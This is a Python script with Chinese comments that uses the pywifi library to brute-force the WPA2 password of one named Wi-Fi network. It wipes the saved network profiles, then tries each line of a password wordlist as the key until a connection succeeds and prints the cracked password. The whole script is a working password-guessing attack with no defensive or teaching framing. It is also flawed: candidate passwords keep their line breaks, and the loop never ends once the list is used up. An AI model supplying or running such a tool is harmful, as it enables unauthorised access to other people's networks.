# coding:utf-8
import pywifi
from pywifi import const
import time

def wifiConnect(pwd):
    #抓取网卡接口
    wifi=pywifi.PyWiFi()
    #获取第一个无线网卡
    ifaces=wifi.interfaces()[0]
    #断开所有链接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus=ifaces.status()
    if wifistatus ==const.IFACE_DISCONNECTED:
        #创建wifi链接文件
        profile=pywifi.Profile()
        #连接的wifi名称
        profile.ssid="ChinaNet-Ri4h"
        #网卡的开放状态
        profile.auth=const.AUTH_ALG_OPEN
        #wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #调用密码
        profile.key=pwd
        #产出所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的链接文件
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        #wifi连接时间
        time.sleep(3)
        if ifaces.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

#读取密码本
def  readPassword():
    print("开始破解:")
    #密码本路径
    path="D:/wifi_password/p_usual.txt"
    #打开文件
    file=open(path,"r")
    while True:
        try:
            #一行一行读取
            pad=file.readline()
            bool=wifiConnect(pad)

            if bool:
                print("密码已破解：",pad)
                print("WIFI已自动连接")
                break
            else:
                print("密码破解中....密码校对:",pad)
        except:
            continue
readPassword()

